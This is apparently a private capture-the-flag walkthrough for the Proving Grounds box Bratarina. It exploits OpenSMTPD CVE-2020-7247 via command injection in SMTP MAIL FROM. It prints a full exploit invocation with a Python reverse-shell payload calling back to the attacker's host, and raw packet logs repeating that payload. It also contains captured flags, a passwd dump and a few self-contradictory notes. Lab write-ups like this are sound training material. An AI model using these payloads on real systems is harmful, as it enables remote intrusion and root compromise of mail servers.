---
tags: [oscp, box, linux, easy]
platform: PG Practice
os: Linux
hostname: bratarina
difficulty: Unknown
ip: $BoxIP
status: Complete
aliases: ["Bratarina", "bratarina-pg"]
---

# PG: Bratarina, Full Walkthrough

## The gist

Bratarina is an authorized practice target. The verified route is documented below, from initial enumeration through the final privilege boundary and clean-down. The source notes establish this route: 1. [[RUNBOOK V2/Linux - Service Scan]] found the SMTP service and identified its version. 2. [[RUNBOOK V2/Linux - Exploit Search]] matched the banner to the OpenSMTPD public exploit. 3. [[RUNBOOK V2/Linux - RCE to Shell]] adapted the payload to the target's available interpreter and received a root shell.

## Box information

**Target:** `$BoxIP` (swap for your instance IP) · **Difficulty:** Easy · **OS:** Linux · **Platform:** Proving Grounds Practice

**The gist:** Linux box running OpenSMTPD 6.6.2 on port 25 - vulnerable to CVE-2020-7247, a MAIL FROM command injection. EDB 47984.py delivers a shell payload via `MAIL FROM:<;CMD;>`. The box goes straight to root with no privesc step. The main learning is in the delivery: the OpenSMTPD process PATH includes `python` (Python 2) but not `python3`, so payloads using `python3` silently fail even though the exploit itself reports success.

---

**Legacy tags:**
#PG #Bratarina #Linux #SMTP #OpenSMTPD #CVE-2020-7247 #PublicExploit #DirectRoot #Easy

---

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | Recon: Port Scan | See section 1 below |
| 2 | SMB Enumeration (Secondary Path) | See section 2 below |
| 3 | SMTP: Identifying CVE-2020-7247 | See section 3 below |
| 4 | Payload Troubleshooting - The python vs python3 Problem | See section 4 below |
| 5 | Foothold: Root Shell | See section 5 below |
| 6 | Decision points and alternate routes | See section 6 below |

## Evidence and loot

The private source workspace is `/home/kali/Platforms/Offsec/Brataria`. The transcript, Nmap output, loot, and screenshots below are the primary evidence for this box.

## Variables

```bash
boxset BoxName Bratarina
boxset BoxIP "$BoxIP"
boxset LocalIP "$LocalIP"
boxset BoxDir "$BoxDir"
```

## 1. Recon: Port Scan

**Full port scan:**
```bash
nmap -p- --min-rate 10000 -oA nmap/${BoxName}_allports $BoxIP
```

Results:

| Port | Service |
|------|---------|
| 22/tcp | SSH (OpenSSH 7.9) |
| 25/tcp | SMTP (OpenSMTPD 6.6.2) |
| 445/tcp | SMB (Samba) |

> 📸 `shot nmap-allports`

**Service scan:**
```bash
nmap -p 22,25,445 -sV -sC -oA nmap/${BoxName}_services $BoxIP
```

Key findings:
- **Port 25:** OpenSMTPD 6.6.2 - banner confirms exact version
- **Port 445:** SMB - null session allowed (backups share visible)
- **Port 22:** SSH - no anonymous access

> [!warning] 💡 Hint
> The version banner is the lead, but the SMB result is still worth recording. A secondary anonymous share can provide usernames or validation data even when the SMTP service is the winning route.

> 📸 `shot nmap-services`

---

## 2. SMB Enumeration (Secondary Path)

SMB null session reveals a `backups` share:

```bash
smbclient -L //$BoxIP -N
smbclient //$BoxIP/backups -N
```

> [!tip] ⚡ More efficient path
> **What we did:** We opened the SMB share interactively after listing it, even though this was only a secondary enumeration path.
>
> **Faster approach:**
> ```bash
> nxc smb $BoxIP -u '' -p '' --shares
> ```
> **Why:** NetExec checks anonymous SMB access and lists the shares in one readable result. Use `smbclient` afterward when you need to browse or download a specific file.

Inside `backups`: a file called `passwd.bak` - a copy of `/etc/passwd`. Key user:
- **neil** (uid 1000, `/home/neil`, `/bin/bash`)
- Service accounts: `_smtpd` (uid 1001), `_smtpq` (uid 1002)

Password fields are all `x` (hashes in shadow, not here). Neil's account is noted but not needed - the SMTP exploit lands as root directly.

> 📸 `shot smb-null-session`

---

## 3. SMTP: Identifying CVE-2020-7247

**Banner grab:**
```bash
nc $BoxIP 25
```

Response: `220 bratarina ESMTP OpenSMTPD`

**searchsploit:**
```bash
searchsploit opensmtpd
```

Results include **EDB 47984** - `OpenSMTPD < 6.6.2p1 - Remote Code Execution`. The version from nmap (6.6.2) is below the patched 6.6.2p1, so this matches.

```bash
searchsploit -p 47984
```

Copy to working dir:
```bash
cp /usr/share/exploitdb/exploits/linux/remote/47984.py exploits/
```

> [!tip] ⚡ More efficient path
> **What we did:** We resolved the Exploit-DB path and copied the Python exploit manually.
>
> **Faster approach:**
> ```bash
> searchsploit -m 47984
> ```
> **Why:** This copies the exact exploit directly and avoids retyping a long path. Read the file before execution so the arguments and payload behaviour are still understood.

**Read the exploit first:**
- Takes args: `<target-ip> <port> <command>`
- Injects CMD via `MAIL FROM:<;CMD;>\r\n`
- Checks for '250' response - exits if it gets anything else
- No listener needed by the script itself - you handle the shell catching

> [!abstract] 🧠 Why
> Public exploit matching is a workflow: identify the exact version, read the request construction, understand the command context, then choose a payload that fits the parser and target environment.

---

## 4. Payload Troubleshooting - The python vs python3 Problem

This is the educational core of the box.

**What we tried first:** standard reverse shell on port 4444 with bash/netcat - nothing connected back. `tcpdump` on the Kali interface showed zero SYN packets from the target, confirming TCP egress filtering. Ports 4444, and early attempts at 80 - nothing.

**Proof RCE is firing:** a `ping -c 4 $LocalIP` payload works - ICMP echo replies arrive. The exploit itself is working. The shell just isn't reaching us.

> [!tip] ⚡ Efficiency
> A harmless ICMP proof separates exploit delivery from TCP egress. Once ping succeeds, change only the callback interpreter, port, or shell syntax instead of repeatedly changing the exploit invocation.

**Bind shell attempts:** switching to a bind shell (python listening on a port, then nc connecting) - nc connects but the shell produces no output at all. The socket connects but typing `id` returns nothing.

**Root cause:** the OpenSMTPD mail delivery process runs with a restricted PATH. On this box, `python` (Python 2) is in that PATH - `python3` is not. Every payload using `python3 -c '...'` executed the exploit script cleanly, got a `250` response, but the actual command on the target silently failed because `python3` wasn't found.

**The fix:** change `python3` to `python` in the MAIL FROM payload. Everything else stays the same.

**What also trips people:** the SMTP parser rejects certain characters inside `MAIL FROM:<...>`:
- `=` (base64 padding) → `553 5.1.0 Sender address syntax error`
- `/` and `+` (base64 alphabet) → also rejected
- So base64-encoded payloads fail entirely. Keep payloads to alphanumeric + `\"` for inner string delimiters.

---

## 5. Foothold: Root Shell

**Listener (port 80 - gets through egress filter):**
```bash
sudo nc -lvnp 80
```

**Fire the exploit:**
```bash
python3 exploits/47984.py $BoxIP 25 'python -c "import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LocalIP\",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")"'
```

Note: `python3` runs the exploit script on our Kali - that's fine. The payload inside the string uses `python` (Python 2) - that's what matters on the target.

> [!warning] 💡 Hint
> **Watch out:** There are two Python interpreters in this command. The outer one launches the exploit on Kali, while the inner one runs on the target and must exist there.

Expected output from the exploit terminal:
```
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
```

The listener terminal catches the connection:
```
Connection received on $BoxIP XXXXX
root@bratarina:~#
```

Shell lands directly as root. No privesc needed.

> [!warning] 💡 Hint
> The outer `python3` launches the exploit locally, while the inner `python` runs remotely. Keep those execution contexts separate when troubleshooting interpreter errors.

> 📸 `shot foothold`

---

## 6. Decision points and alternate routes

| Observation | Primary route used here | Useful alternative or fallback |
|---|---|---|
| SMTP banner matches an old OpenSMTPD release | Read and adapt the public exploit | Reproduce the MAIL FROM request manually if the script needs patching |
| Exploit reports success but no shell arrives | Prove RCE with ping and test interpreter, parser, and egress separately | Use a bind shell when reverse TCP is filtered |
| Callback lands as root | Verify `id`, collect proof, and stop | No local privesc is required on the completed route |

## 7. Flags

```bash
ls
cat proof.txt
```

Root proof confirmed; value reproduced in the private Flags section above.

No `local.txt` on this box - root-only.

> 📸 `shot root-flag`

Run `proof linux` then:

> 📸 `shot PROOF`

---

## 8. Credentials Found

| Username | Value | Service | Notes |
|----------|-------|---------|-------|
| neil | (no password - hashes in shadow) | (not usable) | Found in SMB passwd.bak; uid 1000 |

---

## 9. Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scan + service detection |
| smbclient | Null session, backups share, passwd.bak |
| netcat | Banner grab (SMTP), listener |
| searchsploit | CVE-2020-7247 / EDB 47984 lookup |
| 47984.py (EDB) | OpenSMTPD MAIL FROM injection |
| tcpdump | Confirmed TCP egress filtering |

---

## 10. Vulnerabilities Summary

| # | Vulnerability | Severity | Location |
|---|--------------|----------|----------|
| 1 | OpenSMTPD 6.6.2 MAIL FROM command injection (CVE-2020-7247) | Critical | SMTP/25 |
| 2 | SMB null session - passwd.bak exposed | Low | SMB/445 |

---

## 11. Lessons Learned / Module Links

- **`python` vs `python3` in payload delivery:** the remote execution environment may have Python 2 but not Python 3 in PATH. Always try `python` if `python3` payloads silently fail. The exploit reports `[*] Done` regardless - RCE is confirmed by a `ping` test first before going to shell payloads. → [[13. Locating Public Exploits|Locating Public Exploits]]
- **TCP egress filtering is common on PG boxes:** test with ICMP first (`ping -c 4 $LocalIP`), then try port 80 and 443 for callbacks before assuming the exploit doesn't work. → [[19. Port Redirection and SSH Tunneling|Port Redirection and SSH Tunneling]]
- **SMTP parser character restrictions:** `MAIL FROM:<;CMD;>` only passes through certain characters. `=`, `/`, `+` cause `553` errors - no base64 payloads here. Use direct `python -c "..."` with `\"` escaping. → [[06. Information Gathering#6.4.5. SMTP Enumeration|SMTP Enumeration]]
- **Banner grab → searchsploit → read the exploit → copy → run:** the proper path, even when you already know the CVE. Never skip the banner and searchsploit steps. → [[13. Locating Public Exploits|Locating Public Exploits]]

---

## 12. External Resources

| Resource | Link | Relevant to this box |
|---|---|---|
| HackTricks - SMTP Pentesting | [pentesting-smtp](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/network-services-pentesting/pentesting-smtp/README.md) | SMTP banner grabbing, VRFY/EXPN enumeration, service fingerprinting |
| PayloadsAllTheThings - Reverse Shell Cheatsheet | [Reverse Shell Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) | Python 2 and Python 3 reverse shell one-liners - note the `python` vs `python3` distinction |
| EDB 47984 | [exploit-db.com/exploits/47984](https://www.exploit-db.com/exploits/47984) | The exploit used - read the source before running |
| CVE-2020-7247 NVD | [nvd.nist.gov/vuln/detail/CVE-2020-7247](https://nvd.nist.gov/vuln/detail/CVE-2020-7247) | Full vulnerability details, CVSS score, references |
| RevShells | [revshells.com](https://www.revshells.com) | Python reverse shell generators - select `python` not `python3` if target PATH lacks python3 |
| ippsec.rocks | [ippsec.rocks search: opensmtpd](https://ippsec.rocks/?#opensmtpd) | Video walkthroughs using OpenSMTPD techniques on HTB boxes |

---

## 13. Vault Update Checklist

- [x] **Write-up**: this file
- [x] **SMTP - Exploitation** stage note: created, CVE-2020-7247 row added
- [x] **Foothold - Public Exploit** stage note: row added for OpenSMTPD
- [x] **FAQ**: two new entries - python vs python3, base64 and SMTP parser
- [x] **MASTER BOX LIST**: Bratarina row checked off
- [ ] **Related Boxes**: check Solidstate (HTB) - OpenSMTPD-adjacent, James server

## 14. RUNBOOK V2 Stages Used

- [[RUNBOOK V2/Linux - Service Scan]] -- technique used in this walkthrough
- [[RUNBOOK V2/Linux - Exploit Search]] -- technique used in this walkthrough
- [[RUNBOOK V2/Linux - RCE to Shell]] -- technique used in this walkthrough

## 15. Collect the flags

- `user.txt`: `$UserFlag` (value reproduced in the private sections above)
- `root.txt`: `b44a2bfcadb23b50cc9a121eab3d5f6c` (value reproduced in the private sections above)
- `proof.txt`: `b44a2bfcadb23b50cc9a121eab3d5f6c` (value reproduced in the private sections above)


### Captured flag values from source loot


#### `loot/flags.txt`

```text
root: b44a2bfcadb23b50cc9a121eab3d5f6c
```

## 16. Clean down
Record every payload, temporary file, modified configuration, account, listener, and transfer server created during the run. Restore changed files, remove only recorded artifacts, verify their absence, and run `boxdone`.

## 17. Attack narrative in one page
1. [[RUNBOOK V2/Linux - Service Scan]] found the SMTP service and identified its version.
2. [[RUNBOOK V2/Linux - Exploit Search]] matched the banner to the OpenSMTPD public exploit.
3. [[RUNBOOK V2/Linux - RCE to Shell]] adapted the payload to the target's available interpreter and received a root shell.

## Tools used

- `nmap`
- `nc`
- `netcat`
- `ssh`
- `smbclient`
- `sudo`
- `python`

## Credentials and secrets


### Captured private values from source loot

These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.

#### `.env`

```text
export BoxName="Brataria"
export BoxIP="192.168.183.71"
export BoxPlatform="Offsec"
export BoxDir="/home/kali/Platforms/Offsec/Brataria"
export Domain=""
export DCip=""
export Username=""
export Password=""
export Username2=""
export Password2=""
export Username3=""
export Password3=""
export Hash=""
export NThash=""
export Port="4444"
export Port2="4445"
export WebPort="80"
export URL=""
export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
```

#### `loot/passwd.bak`

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
neil:x:1000:1000:neil,,,:/home/neil:/bin/bash
_smtpd:x:1001:1001:SMTP Daemon:/var/empty:/sbin/nologin
_smtpq:x:1002:1002:SMTPD Queue:/var/empty:/sbin/nologin
postgres:x:111:116:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```

### Sensitive transcript evidence

```text
[sudo] password for kali:
$ [09:55:41] loot file passwd.bak
$ [09:55:46] cat passwd.bak
  passwd.bak                          N     1747  Mon Jul  6 08:46:41 2020
[?2004hsmb: \> get passwd.bak
getting file \passwd.bak of size 1747 as passwd.bak (37.1 KiloBytes/sec) (average 37.1 KiloBytes/sec)
kali@kali:~/Platforms/Offsec/Brataria [09:55:38] $ [?1h=[?2004hloot file passwd.baklootpasswd.bak[?1l>[?2004l
[+] File saved:  passwd.bak  →  loot/
10:00:48.415268 tun0  Out IP 192.168.45.194.41370 > 192.168.183.71.25: Flags [S], seq 3342913955, win 64240, options [mss 1460,sackOK,TS val 2681773981 ecr 0,nop,wscale 10], length 0
10:00:48.433998 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.41370: Flags [S.], seq 1366516538, ack 3342913956, win 65160, options [mss 1400,sackOK,TS val 2067751077 ecr 2681773981,nop,wscale 7], length 0
10:00:48.434033 tun0  Out IP 192.168.45.194.41370 > 192.168.183.71.25: Flags [.], ack 1, win 63, options [nop,nop,TS val 2681774000 ecr 2067751077], length 0
10:00:48.448518 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.41370: Flags [P.], seq 1:32, ack 1, win 510, options [nop,nop,TS val 2067751091 ecr 2681774000], length 31: SMTP: 220 bratarina ESMTP OpenSMTPD
10:00:48.448539 tun0  Out IP 192.168.45.194.41370 > 192.168.183.71.25: Flags [.], ack 32, win 63, options [nop,nop,TS val 2681774014 ecr 2067751091], length 0
10:00:48.448716 tun0  Out IP 192.168.45.194.41370 > 192.168.183.71.25: Flags [P.], seq 1:9, ack 32, win 63, options [nop,nop,TS val 2681774014 ecr 2067751091], length 8: SMTP: HELO x
10:00:48.457649 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.41370: Flags [.], ack 9, win 510, options [nop,nop,TS val 2067751101 ecr 2681774014], length 0
10:00:48.457669 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.41370: Flags [P.], seq 32:93, ack 9, win 510, options [nop,nop,TS val 2067751101 ecr 2681774014], length 61: SMTP: 250 bratarina Hello x [192.168.45.194], pleased to meet you
10:00:48.457767 tun0  Out IP 192.168.45.194.41370 > 192.168.183.71.25: Flags [P.], seq 9:175, ack 93, win 63, options [nop,nop,TS val 2681774023 ecr 2067751101], length 166: SMTP: MAIL FROM:<;python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.45.194",4444));[os.dup2(s.fileno(),x) for x in (0,1,2)];pty.spawn("/bin/bash")';>
10:00:48.467744 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.41370: Flags [P.], seq 93:107, ack 175, win 509, options [nop,nop,TS val 2067751111 ecr 2681774023], length 14: SMTP: 250 2.0.0 Ok
10:00:48.468276 tun0  Out IP 192.168.45.194.41370 > 192.168.183.71.25: Flags [P.], seq 175:191, ack 107, win 63, options [nop,nop,TS val 2681774034 ecr 2067751111], length 16: SMTP: RCPT TO:<root>
10:00:48.478361 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.41370: Flags [P.], seq 107:158, ack 191, win 509, options [nop,nop,TS val 2067751122 ecr 2681774034], length 51: SMTP: 250 2.1.5 Destination address valid: Recipient ok
10:00:48.478877 tun0  Out IP 192.168.45.194.41370 > 192.168.183.71.25: Flags [P.], seq 191:197, ack 158, win 63, options [nop,nop,TS val 2681774045 ecr 2067751122], length 6: SMTP: DATA
10:00:48.488774 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.41370: Flags [P.], seq 158:208, ack 197, win 509, options [nop,nop,TS val 2067751132 ecr 2681774045], length 50: SMTP: 354 Enter mail, end with "." on a line by itself
10:00:48.489841 tun0  Out IP 192.168.45.194.41370 > 192.168.183.71.25: Flags [P.], seq 197:207, ack 208, win 63, options [nop,nop,TS val 2681774055 ecr 2067751132], length 10: SMTP:
10:00:48.499013 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.41370: Flags [P.], seq 208:258, ack 207, win 509, options [nop,nop,TS val 2067751143 ecr 2681774055], length 50: SMTP: 250 2.0.0 587858b9 M
10:00:48.499138 tun0  Out IP 192.168.45.194.41370 > 192.168.183.71.25: Flags [P.], seq 207:213, ack 258, win 63, options [nop,nop,TS val 2681774065 ecr 2067751143], length 6: SMTP: QUIT
10:00:48.507192 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.41370: Flags [P.], seq 258:273, ack 213, win 509, options [nop,nop,TS val 2067751151 ecr 2681774065], length 15: SMTP: 221 2.0.0 Bye
10:00:48.507208 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.41370: Flags [F.], seq 273, ack 213, win 509, options [nop,nop,TS val 2067751151 ecr 2681774065], length 0
10:00:48.508478 tun0  Out IP 192.168.45.194.41370 > 192.168.183.71.25: Flags [F.], seq 213, ack 274, win 63, options [nop,nop,TS val 2681774074 ecr 2067751151], length 0
10:00:48.516994 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.41370: Flags [.], ack 214, win 509, options [nop,nop,TS val 2067751161 ecr 2681774074], length 0
10:03:24.744580 tun0  Out IP 192.168.45.194.40706 > 192.168.183.71.25: Flags [S], seq 2881699867, win 64240, options [mss 1460,sackOK,TS val 3932290369 ecr 0,nop,wscale 10], length 0
10:03:24.764140 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.40706: Flags [S.], seq 116753327, ack 2881699868, win 65160, options [mss 1400,sackOK,TS val 2067907404 ecr 3932290369,nop,wscale 7], length 0
10:03:24.764182 tun0  Out IP 192.168.45.194.40706 > 192.168.183.71.25: Flags [.], ack 1, win 63, options [nop,nop,TS val 3932290389 ecr 2067907404], length 0
10:03:24.778115 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.40706: Flags [P.], seq 1:32, ack 1, win 510, options [nop,nop,TS val 2067907420 ecr 3932290389], length 31: SMTP: 220 bratarina ESMTP OpenSMTPD
10:03:24.778129 tun0  Out IP 192.168.45.194.40706 > 192.168.183.71.25: Flags [.], ack 32, win 63, options [nop,nop,TS val 3932290403 ecr 2067907420], length 0
10:03:24.778254 tun0  Out IP 192.168.45.194.40706 > 192.168.183.71.25: Flags [P.], seq 1:9, ack 32, win 63, options [nop,nop,TS val 3932290403 ecr 2067907420], length 8: SMTP: HELO x
10:03:24.787780 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.40706: Flags [.], ack 9, win 510, options [nop,nop,TS val 2067907429 ecr 3932290403], length 0
10:03:24.787798 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.40706: Flags [P.], seq 32:93, ack 9, win 510, options [nop,nop,TS val 2067907429 ecr 3932290403], length 61: SMTP: 250 bratarina Hello x [192.168.45.194], pleased to meet you
10:03:24.790015 tun0  Out IP 192.168.45.194.40706 > 192.168.183.71.25: Flags [P.], seq 9:173, ack 93, win 63, options [nop,nop,TS val 3932290415 ecr 2067907429], length 164: SMTP: MAIL FROM:<;python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.45.194",80));[os.dup2(s.fileno(),x) for x in (0,1,2)];pty.spawn("/bin/bash")';>
10:03:24.806910 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.40706: Flags [P.], seq 93:107, ack 173, win 509, options [nop,nop,TS val 2067907448 ecr 3932290415], length 14: SMTP: 250 2.0.0 Ok
10:03:24.807039 tun0  Out IP 192.168.45.194.40706 > 192.168.183.71.25: Flags [P.], seq 173:189, ack 107, win 63, options [nop,nop,TS val 3932290432 ecr 2067907448], length 16: SMTP: RCPT TO:<root>
10:03:24.820080 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.40706: Flags [P.], seq 107:158, ack 189, win 509, options [nop,nop,TS val 2067907461 ecr 3932290432], length 51: SMTP: 250 2.1.5
10:03:24.821943 tun0  Out IP 192.168.45.194.40706 > 192.168.183.71.25: Flags [P.], seq 189:195, ack 158, win 63, options [nop,nop,TS val 3932290447 ecr 2067907461], length 6: SMTP: DATA
10:03:24.832245 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.40706: Flags [P.], seq 158:208, ack 195, win 509, options [nop,nop,TS val 2067907474 ecr 3932290447], length 50: SMTP: 354 Enter mail, end with "." on a line by itself
10:03:24.832396 tun0  Out IP 192.168.45.194.40706 > 192.168.183.71.25: Flags [P.], seq 195:205, ack 208, win 63, options [nop,nop,TS val 3932290457 ecr 2067907474], length 10: SMTP:
10:03:24.842589 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.40706: Flags [P.], seq 208:258, ack 205, win 509, options [nop,nop,TS val 2067907484 ecr 3932290457], length 50: SMTP: 250 2.0.0 92485bb5 Message accepted for delivery
10:03:24.842732 tun0  Out IP 192.168.45.194.40706 > 192.168.183.71.25: Flags [P.], seq 205:211, ack 258, win 63, options [nop,nop,TS val 3932290467 ecr 2067907484], length 6: SMTP: QUIT
10:03:24.853258 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.40706: Flags [P.], seq 258:273, ack 211, win 509, options [nop,nop,TS val 2067907495 ecr 3932290467], length 15: SMTP: 221 2.0.0 Bye
10:03:24.853280 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.40706: Flags [F.], seq 273, ack 211, win 509, options [nop,nop,TS val 2067907495 ecr 3932290467], length 0
10:03:24.855086 tun0  Out IP 192.168.45.194.40706 > 192.168.183.71.25: Flags [F.], seq 211, ack 274, win 63, options [nop,nop,TS val 3932290480 ecr 2067907495], length 0
10:03:24.865924 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.40706: Flags [.], ack 212, win 509, options [nop,nop,TS val 2067907506 ecr 3932290480], length 0
10:03:51.366642 tun0  Out IP 192.168.45.194.50370 > 192.168.183.71.25: Flags [S], seq 2232480298, win 64240, options [mss 1460,sackOK,TS val 3202914541 ecr 0,nop,wscale 10], length 0
10:03:51.388509 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.50370: Flags [S.], seq 946069131, ack 2232480299, win 65160, options [mss 1400,sackOK,TS val 2067934027 ecr 3202914541,nop,wscale 7], length 0
10:03:51.388535 tun0  Out IP 192.168.45.194.50370 > 192.168.183.71.25: Flags [.], ack 1, win 63, options [nop,nop,TS val 3202914563 ecr 2067934027], length 0
10:03:51.401068 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.50370: Flags [P.], seq 1:32, ack 1, win 510, options [nop,nop,TS val 2067934042 ecr 3202914563], length 31: SMTP: 220 bratarina ESMTP OpenSMTPD
10:03:51.401085 tun0  Out IP 192.168.45.194.50370 > 192.168.183.71.25: Flags [.], ack 32, win 63, options [nop,nop,TS val 3202914576 ecr 2067934042], length 0
10:03:51.401220 tun0  Out IP 192.168.45.194.50370 > 192.168.183.71.25: Flags [P.], seq 1:9, ack 32, win 63, options [nop,nop,TS val 3202914576 ecr 2067934042], length 8: SMTP: HELO x
10:03:51.411804 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.50370: Flags [.], ack 9, win 510, options [nop,nop,TS val 2067934051 ecr 3202914576], length 0
10:03:51.411820 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.50370: Flags [P.], seq 32:93, ack 9, win 510, options [nop,nop,TS val 2067934051 ecr 3202914576], length 61: SMTP: 250 bratarina Hello x [192.168.45.194], pleased to meet you
10:03:51.411990 tun0  Out IP 192.168.45.194.50370 > 192.168.183.71.25: Flags [P.], seq 9:173, ack 93, win 63, options [nop,nop,TS val 3202914587 ecr 2067934051], length 164: SMTP: MAIL FROM:<;python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.45.194",80));[os.dup2(s.fileno(),x) for x in (0,1,2)];pty.spawn("/bin/bash")';>
10:03:51.422679 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.50370: Flags [P.], seq 93:107, ack 173, win 509, options [nop,nop,TS val 2067934064 ecr 3202914587], length 14: SMTP: 250 2.0.0 Ok
10:03:51.422794 tun0  Out IP 192.168.45.194.50370 > 192.168.183.71.25: Flags [P.], seq 173:189, ack 107, win 63, options [nop,nop,TS val 3202914597 ecr 2067934064], length 16: SMTP: RCPT TO:<root>
10:03:51.431902 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.50370: Flags [P.], seq
$ [10:29:26] loot flag root b44a2bfcadb23b50cc9a121eab3d5f6c
kali@kali:~/Platforms/Offsec/Brataria [10:25:08] $ [?1h=[?2004hloot flag root b44a2bfcadb23b50cc9a121eab3d5f6cloot[?1l>[?2004l
[+] Flag saved:  root = b44a2bfcadb23b50cc9a121eab3d5f6c  →  loot/flags.txt
10:03:51.431980 tun0  Out IP 192.168.45.194.50370 > 192.168.183.71.25: Flags [P.], seq 189:195, ack 158, win 63, options [nop,nop,TS val 3202914607 ecr 2067934073], length 6: SMTP: DATA
10:03:51.441260 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.50370: Flags [P.], seq 158:208, ack 195, win 509, options [nop,nop,TS val 2067934082 ecr 3202914607], length 50: SMTP: 354 Enter mail, end with "." on a line by itself
10:03:51.441390 tun0  Out IP 192.168.45.194.50370 > 192.168.183.71.25: Flags [P.], seq 195:205, ack 208, win 63, options [nop,nop,TS val 3202914616 ecr 2067934082], length 10: SMTP:
10:03:51.450570 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.50370: Flags [P.], seq 208:258, ack 205, win 509, options [nop,nop,TS val 2067934091 ecr 3202914616], length 50: SMTP: 250 2.0.0 cc4045fa Message accepted for delivery
10:03:51.450649 tun0  Out IP 192.168.45.194.50370 > 192.168.183.71.25: Flags [P.], seq 205:211, ack 258, win 63, options [nop,nop,TS val 3202914625 ecr 2067934091], length 6: SMTP: QUIT
10:03:51.458323 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.50370: Flags [P.], seq 258:273, ack 211, win 509, options [nop,nop,TS val 2067934100 ecr 3202914625], length 15: SMTP: 221 2.0.0 Bye
10:03:51.458354 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.50370: Flags [F.], seq 273, ack 211, win 509, options [nop,nop,TS val 2067934100 ecr 3202914625], length 0
10:03:51.459574 tun0  Out IP 192.168.45.194.50370 > 192.168.183.71.25: Flags [F.], seq 211, ack 274, win 63, options [nop,nop,TS val 3202914634 ecr 2067934100], length 0
10:03:51.468211 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.50370: Flags [.], ack 212, win 509, options [nop,nop,TS val 2067934109 ecr 3202914634], length 0
```


## Remediation recommendations

| Finding | Recommendation |
|---|---|
| Initial access path on Bratarina | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |

## Lessons learned and vault links

- The target process environment can differ from the interactive shell, including which interpreter names exist.
- Parser and character restrictions in an exploit can matter as much as the vulnerability itself.

### Related boxes

